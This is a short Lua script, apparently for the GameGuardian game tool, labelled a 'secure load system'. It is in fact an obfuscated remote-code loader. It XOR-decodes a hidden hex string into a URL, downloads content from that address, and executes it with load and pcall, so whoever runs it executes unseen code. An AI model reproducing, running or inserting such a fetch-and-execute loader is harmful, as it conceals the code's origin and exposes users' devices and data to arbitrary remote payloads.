-- JULES-CORE SECURE LOAD SYSTEM
local _c,_b,_t=string.char,string.byte,tonumber;local _k=string.char(74,85,76,69,83,45,83,69,67,85,82,69,45,88);local VXload=function(_h)local _u=""for i=1,#_h,2 do local _bv=_t(_h:sub(i,i+1),16)local _kv=_b(_k,((i/2-0.5)%#_k)+1)_u=_u.._c(_bv~_kv)end;local _r=gg.makeRequest(_u)if _r and _r.code==200 then local _f,_e=load(_r.content)if _f then pcall(_f)else gg.alert("Fail: ".._e)end else gg.toast("🚫 Net Error")end end

VXload("2221383520176C60352C5E3F6B3E232124303158302A20264225313C242162263C406C07130C7E0E766065627B23361F707F62754C2D736A28362823604C7B7833721C2A726878667A706502312E256A152874687A36747D324E757B65201F7A776C28647A716418272E67234E7A266F7D632A73664B76787D02")
